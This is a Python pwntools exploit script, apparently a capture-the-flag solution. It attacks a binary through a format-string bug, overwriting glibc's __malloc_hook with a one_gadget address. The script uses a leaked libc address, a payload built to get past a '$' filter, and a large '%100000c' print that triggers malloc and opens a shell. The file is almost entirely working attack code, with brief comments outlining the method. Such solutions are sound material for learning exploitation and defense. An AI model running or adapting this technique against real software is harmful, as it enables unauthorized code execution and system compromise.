#!/usr/bin/env python3

from pwn import *

exe = ELF("./app_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

gs = """
b main
b malloc
b printf
c
"""
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gs)
    else:
        r = remote("addr", 1337)

    return r

idx = 8
def main():
    r = conn()
    # good luck pwning :)
    # =================solver==============
    # 1- overwrite the __malloc_hook
    # 2- print a very big number of chars using the %<num>c  so stack won't be able to store it so it will malloc a space from the heap and fires the malloc hook
    # 3- to bypass the $ filter just use the argument  no_dollars=True in the fmtstr_payload function
    #======================================
    r.recvuntil(b'[+] Clue: ')
    libc_leak = int(r.recvline().strip(), 16)
    log.info(f'leak libc @: {hex(libc_leak)}')
    libc_base = libc_leak - 0x3c5620
    log.info(f'libc base @: {hex(libc_base)}')
    malloc_hook = libc_leak - 0xb10
    log.info(f'malloc hook @: {hex(malloc_hook)}')
    one_gadget = libc_base + 0x4527a
    writes = {
        malloc_hook: one_gadget
    }
    payload = fmtstr_payload(idx, writes, write_size='byte', no_dollars=True)
    print(len(payload))
    print(payload)
    r.sendline(payload)
    r.sendline(b'%100000c')

    r.interactive()


if __name__ == "__main__":
    main()
